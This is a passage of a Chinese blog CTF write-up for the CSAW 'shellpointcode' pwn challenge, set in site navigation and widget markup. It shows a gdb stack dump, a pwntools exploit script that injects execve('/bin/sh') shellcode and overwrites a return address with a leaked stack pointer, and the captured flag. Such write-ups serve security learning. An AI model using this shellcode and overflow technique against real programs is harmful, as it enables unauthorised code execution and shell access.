RSP: 0x7ffea8fe2638 --&gt; 0x7ffea8fe2668 --&gt; 0xf631583b6ae78948
RIP: 0x55d7207d08ee (ret)
R8 : 0x7f1f40a5e700 (0x00007f1f40a5e700)
R9 : 0x19
R10: 0x11
R11: 0x246
R12: 0x55d7207d0720 (xor    ebp,ebp)
R13: 0x7ffea8fe2770 --&gt; 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55d7207d08e7:  call   0x55d7207d06d0
   0x55d7207d08ec:  nop
   0x55d7207d08ed:  leave  
=&gt; 0x55d7207d08ee:  ret    
   0x55d7207d08ef:  push   rbp
   0x55d7207d08f0:  mov    rbp,rsp
   0x55d7207d08f3:  sub    rsp,0x40
   0x55d7207d08f7:  lea    rax,[rbp-0x40]
[------------------------------------stack-------------------------------------]
0000| 0x7ffea8fe2638 --&gt; 0x7ffea8fe2668 --&gt; 0xf631583b6ae78948
0008| 0x7ffea8fe2640 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)
0016| 0x7ffea8fe2648 --&gt; 0xa (&#39;\n&#39;)
0024| 0x7ffea8fe2650 --&gt; 0x0
0032| 0x7ffea8fe2658 --&gt; 0x7f1f40851620 --&gt; 0xfbad2887
0040| 0x7ffea8fe2660 --&gt; 0x7ffea8fe2640 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)
0048| 0x7ffea8fe2668 --&gt; 0xf631583b6ae78948
0056| 0x7ffea8fe2670 --&gt; 0xa050f99
[------------------------------------------------------------------------------] blue
Legend: code, data, rodata, value
0x000055d7207d08ee in ?? ()
</code></pre><p>execve的汇编可以参考<br><a href="http://spd.dropsec.xyz/2017/02/20/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90execve%E5%87%BD%E6%95%B0/" target="_blank" rel="noopener">http://spd.dropsec.xyz/2017/02/20/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90execve%E5%87%BD%E6%95%B0/</a></p>
<p>EXP</p>
<pre><code class="python">from pwn import*
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
n = process(&#39;./shellpointcode&#39;)
#n = remote(&#39;pwn.chal.csaw.io&#39;,9005)
shellcode =&quot;&quot;&quot;
    mov rdi, rsp      /* call execve(&#39;rsp&#39;,0,0) rsp-&gt;&#39;/bin/sh\0&#39; */
    push 0x3b         /* sys_execve */
    pop rax
    xor esi,esi
    syscall
&quot;&quot;&quot;
#print len(asm(shellcode))
#raw_input()
n.sendline(asm(shellcode))
sleep(0.1)
n.sendline(&#39;&#39;)
n.recvuntil(&quot;node.next: &quot;)
stack = int(n.recvuntil(&#39;\n&#39;),16)
#gdb.attach(n)
node_2 = stack + 0x28
n.sendline(&#39;a&#39;*11 + p64(node_2) + &#39;/bin/sh\0&#39;)
n.interactive()
</code></pre>
<p>FLAG</p>
<pre><code>flag{NONONODE_YOU_WRECKED_BRO}
</code></pre>
        </div>
        <!-- .entry-content -->
        <div class="single-reward">
          <div class="reward-open">赏
            <div class="reward-main">
              <ul class="reward-row">
                <li class="alipay-code"><img src="null"></li>
                <li class="wechat-code"><img src="null"></li>
              </ul>
            </div>
          </div>
        </div>
        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
        <footer class="post-footer">
          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
          <div class="post-tags">
          </div>
          <div class="post-share">
            <div class="social-share sharehidden share-component"></div>
            <i class="iconfont show-share icon-forward"></i>
          </div>
        </footer><!-- .entry-footer -->
      </article>
      <!-- #post-## -->
      <div class="toc" style="background: none;"></div>
      <section class="post-squares nextprev">
        
          
            <div class="post-nepre half previous">
          
            <a href="/2019/11/05/picoCTFのpwn解析/" rel="prev">
              <div class="background">
                <img class="lazyload" src="" data-src="https://p2.ssl.qhimg.com/t01f20b1ea3950aa6f6.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://p2.ssl.qhimg.com/t01f20b1ea3950aa6f6.jpg">
              </div>
              <span class="label">
              Previous Post</span>
              <div class="info">
                <h3>
                picoCTFのpwn解析</h3>
                <hr>
              </div>
            </a>
          </div>
        
        
          
            <div class="post-nepre half next">
          
            <a href="/2019/11/05/ROP-Emporium/" rel="next">
              <div class="background">
                <img class="lazyload" src="" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
              </div>
              <span class="label">
              Next Post</span>
              <div class="info">
                <h3>
                ROP_Emporium</h3>
                <hr>
              </div>
            </a>
          </div>
        
      </section>
      
<div id="vcomments"></div>
<script>
  window.onload = function(){
      var valine = new Valine();
      valine.init({
        el: '#vcomments',
        appId: "aAE6NeF5HCQ0WM9kYD4ywdDw-gzGzoHsz",
        appKey: "EEpyRysaKmv7aOJjR1o9E4Eq",
        path: window.location.pathname,
        placeholder: "你是我一生只会遇见一次的惊喜 ..."
      })
  }
</script>

      <section class="author-profile">
        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
          <a href="https://nepire.github.io/" class="profile gravatar"><img src="/images/title.ico" itemprop="image" alt="nepire" height="70" width="70"></a>
          <div class="meta">
            <span class="title">Author</span>
            <h3 itemprop="name">
            <a href="https://nepire.github.io/" itemprop="url" rel="author">nepire</a>
            </h3>
          </div>
        </div>
        <hr>
        <p><i class="iconfont icon-write"></i>逐梦者</p>
      </section>
    </main><!-- #main -->
  </div><!-- #primary -->
</div>



    </div>    
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            // PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
    <!-- <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 nepire<br>
      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer> -->
<footer id="colophon" class="site-footer" role="contentinfo">
  <div class="site-info">
    <div class="footertext">
      <div class="img-preload">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
      </div>
      <p style="color: #666666;">&copy 2018</p>
    </div>
    <div class="footer-device">
    <p style="font-family: 'Ubuntu', sans-serif;">
        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
        </span>
      </p>
    </div>
  </div><!-- .site-info -->
</footer>



<!-- <script src="/js/tocbot.js"></script> -->
<script type="text/javascript" src="/js/lib.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script type="text/javascript" src="/js/InsightSearch.js"></script>
<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
<script type="text/javascript" src="/js/zoom.min.js"></script>
<script type="text/javascript" src="/js/sakura-app.js"></script>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
<script src="/js/botui.js"></script>
<!-- 不蒜子 网页计数器 -->
<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
<script type="text/javascript">
/* <![CDATA[ */
if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  var Poi = {"pjax":"1","movies":{"url": "","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
} else {
  var Poi = {"pjax":"1","movies":{"url": "","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
}
/* ]]> */

</script>
<script>
$(document).ready(function() {
  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
    if ($(".pattern-center").length > 0) { //有图的情况
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -400,
          scrollSmoothOffset: -85
      });
    } else {
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -85,
          scrollSmoothOffset: -85
      });
    }
    var offsetTop = $('.toc').offset().top - 95;
    window.onscroll = function() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
      if (scrollTop >= offsetTop) {
        $('.toc').addClass('toc-fixed');
      } else {
        $('.toc').removeClass('toc-fixed');
      }
    }
  }
});
</script>

    <div class="openNav no-select" style="height: 50px;">
      <div class="iconflat no-select" style="width: 50px; height: 50px;">
        <div class="icon"></div>
      </div>
      <div class="site-branding search-form-submit">
        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
      </div>
    </div>
  </section>
  <div id="mo-nav" class="">
  <div class="m-avatar">
    <img src="/images/title.ico">
  </div>
  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">艦隊nepire</p>
  <p style="text-align: center; word-spacing: 20px;">
    
      
        <a href="https://github.com/Nepire" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
      
        <a href="https://github.com/Nepire" class="fa fa-weibo" target="_blank" style="color: #dd4b39; margin-left:20px"></a>
      
        <a href="https://github.com/Nepire" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
      
    
  </p>
  <ul id="menu-new-1" class="menu">
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
            首页
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/archives">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
            归档
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/categories/技术/">
                  <i class="fa fa-code" aria-hidden="true"></i>
                  技术
                </a>
              </li>
            
              <li>
                <a href="/categories/生活/">
                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
                  生活
                </a>
              </li>
            
              <li>
                <a href="/categories/资源/">
                  <i class="fa fa-cloud-download" aria-hidden="true"></i>
                  资源
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="javascript:;">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
            清单
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/tags/悦读/">
                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
                  书单
                </a>
              </li>
            
              <li>
                <a href="/bangumi/">
                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
                  番组
                </a>
              </li>
            
              <li>
                <a href="/music/">
                  <i class="fa fa-headphones" aria-hidden="true"></i>
                  歌单
                </a>
              </li>
            
              <li>
                <a href="/tags/图集/">
                  <i class="fa fa-photo" aria-hidden="true"></i>
                  图集
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/comment/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
            留言板
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/links/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
            友人帐
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/donate/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
            赞赏
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
            关于
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/about/">
                  <i class="fa fa-meetup" aria-hidden="true"></i>
                  我？
                </a>
              </li>
            
              <li>
                <a href="/theme-sakura/">
                  <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
                  主题
                </a>
              </li>
            
              <li>
                <a href="/lab/">
                  <i class="fa fa-cogs" aria-hidden="true"></i>
                  Lab
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/client/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
            客户端
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/atom.xml">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
            RSS
          </span>
        </a>
        
      </li>
    
  </ul>
  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
</div>
<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
<!-- require MetingJS -->
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
<style>
  .aplayer .aplayer-lrc {
    height: 35px;
  }
  .aplayer .aplayer-lrc p{
    font-size: 16px;
    font-weight: 700;
    line-height: 18px !important;
  }
  .aplayer .aplayer-lrc p.aplayer-lrc-current{
    color: #FF1493;
  }
  .aplayer.aplayer-narrow .aplayer-body{
    left: -66px !important;
  }
  .aplayer.aplayer-fixed .aplayer-lrc {
    display: none;
  }
  .aplayer .aplayer-lrc.aplayer-lrc-hide {
      display:none !important;
  }
  .aplayer.aplayer-fixed .lrc-show {
    display: block;
    background: rgba(255, 255, 255, 0.8);
  }
</style>
<meting-js

    id="2660651585"

    server="netease"

    type="playlist"

    fixed="true"

    autoplay="false"

    loop="all"

    order="random"

    preload="auto"

    volume="0.7"

    mutex="true"

</meting-js>
<script>
  $(function(){
    $('body').on('click', '.aplayer', function(){
      if($('.aplayer-button').hasClass('aplayer-play')) {
        $('.aplayer-lrc').removeClass('lrc-show');
      } else {
        $('.aplayer-lrc').addClass('lrc-show');
      }
    })
  });
</script>
</body>
</html>